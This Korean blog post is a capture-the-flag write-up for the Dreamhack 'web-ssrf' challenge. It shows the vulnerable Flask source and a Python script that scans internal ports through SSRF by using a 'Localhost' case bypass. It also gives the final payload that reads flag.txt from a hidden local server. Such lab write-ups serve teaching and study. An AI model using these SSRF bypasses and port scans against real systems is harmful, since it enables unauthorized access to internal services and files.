---
title: "[CTF] 드림핵 web-ssrf"
date: 2025-09-19 21:20:00 +0900
categories: [CTF, Web]
tags: [CTF, SSRF]
description: "드림핵 web-ssrf"
author: "송지민"
toc: true
---

## 문제 개요

이번 문제는 외부 이미지를 받아와 base64로 인코딩해 보여주는 간단한 이미지 뷰어이다. 내부적으로는 `requests.get()`로 URL을 가져오며, 내부 localhost(127.0.0.1) 또는 `localhost` 도메인을 포함하면 미리 준비된 `error.png`를 대신 반환한다. 그러나 내부에서 별도로 띄운 로컬 HTTP 서버가 `127.0.0.1:1500-1800` 사이의 랜덤 포트로 실행 중이므로, SSRF를 이용해 해당 포트에서 `flag.txt`를 읽어올 수 있다.

* 엔드포인트: `/img_viewer` (GET: 폼, POST: `url` 파라미터로 이미지 URL 전송)
* 핵심 취약점: 외부 URL을 서버에서 가져오지만, localhost 필터 우회 및 내부 포트 스캐닝으로 내부 서버 자원 접근 가능
* FLAG 위치: `/flag.txt` (애플리케이션 루트)

---

## 문제에 제공된 원본 소스코드

아래는 문제에서 제공된 `app.py` 전체 소스코드이다.

```python
#!/usr/bin/python3
from flask import (
    Flask,
    request,
    render_template
)
import http.server
import threading
import requests
import os, random, base64
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()  # Flag is here!!
except:
    FLAG = "[**FLAG**]"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)


local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```

---

## 내가 실제로 푼 방법

서버는 `localhost`/`127.0.0.1`을 포함하는 URL에 대해 직접 차단(대신 `error.png` 반환)을 하고, URL이 `/`로 시작하면 `http://localhost:8000`으로 강제 변환한다. 그러나 문제는 서버 내부에 별도로 `127.0.0.1`에서 `1500`\~`1800` 사이의 랜덤 포트로 로컬 HTTP 서버가 띄워져 있다는 점이다. 이 서버는 외부에서 직접 알려주지 않으므로 포트를 스캔해 찾아야 한다.

우회 전략은 다음과 같다.

1. `/img_viewer`에 POST로 `url`을 보낼 때, `localhost` 필터링에 걸리지 않는 형태(예: `Localhost` 대소문자 조합)를 사용하거나, 프로토콜/호스트 표기에서 필터를 우회한다. (문제의 소스는 `"localhost" in urlp.netloc` 체크를 사용하므로 `Localhost`처럼 대소문자 변경으로 우회 가능하다.)
2. 1500\~1800 범위의 포트를 하나씩 시도해 내부 서버가 응답하는 포트를 찾는다. 내부 서버가 해당 포트에 있으면 `requests.get()`이 성공하고, 반환된 이미지(base64 문자열)를 이용해 내부 파일(`/flag.txt`)를 가져올 수 있다.

내가 사용한 포트 스캐닝 스크립트(요약):

```python
#!/usr/bin/python3
import requests
import sys
from tqdm import tqdm

# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"

def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
    
    
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
    
    
if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host1.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()
```

* 스크립트는 challenge 엔드포인트에 `url` 파라미터로 `http://Localhost:{port}`을 보내고, 응답 HTML에 포함된 base64 이미지의 시작값(`iVBORw0KG`)을 검사하여 정상 이미지인지(=internal server responded) 확인한다. `error.png`의 base64는 `iVBORw0KG`로 시작하므로 이를 기준으로 필터한다.

포트를 찾으면 최종적으로 다음과 같이 요청해 내부 서버에서 `flag.txt`를 가져온다:

```
http://Localhost:{FOUND_PORT}/flag.txt
```

이 값을 `/img_viewer`에 넣어 POST하면, 서버가 내부 포트에서 파일 내용을 가져와 base64로 인코딩해 HTML에 넣어준다. 브라우저에서 img src에 포함된 base64를 디코딩하면 flag.txt의 내용이 나온다.

---

## 재현 흐름

1. 공격자: 포트 스캐너 스크립트 실행 → `/img_viewer`에 차례로 `http://Localhost:{port}` 전송
2. 서버: 내부 포트에서 응답이 있을 때 HTML에 정상 이미지(base64) 포함
3. 공격자: 정상 응답 포트 확인 → `/img_viewer`에 `http://Localhost:{found_port}/flag.txt` 전송
4. 서버: 내부 서버에서 `flag.txt`를 가져와 base64로 인코딩해 HTML에 포함 → 공격자가 디코딩하여 FLAG 확인

---

## 왜 이게 가능했나

* 서버는 내부 `127.0.0.1`/`localhost` 접근을 단순히 문자열 포함 검사로 차단했으며, 이 검사는 대소문자나 포맷 조작으로 우회될 수 있다.
* 내부 HTTP 서버가 외부에 알려지지 않은 포트 범위(1500–1800)에 실행되고 있어, 포트 스캐닝으로 해당 포트를 찾을 수 있다.
* 서버가 가져온 컨텐츠를 그대로 base64로 변환해 페이지에 넣기 때문에 내부 파일 내용도 노출 가능했다.

---

## 마무리

이번 문제는 전형적인 SSRF + 포트 스캐닝 결합 문제였다. `localhost` 필터를 단순 문자열 검사로 처리하거나, 내부 서비스 포트를 미리 알려주지 않는다고 해도 포트 스캐닝과 소문자/대문자 우회로 쉽게 내부 리소스에 접근할 수 있음을 보여준다.
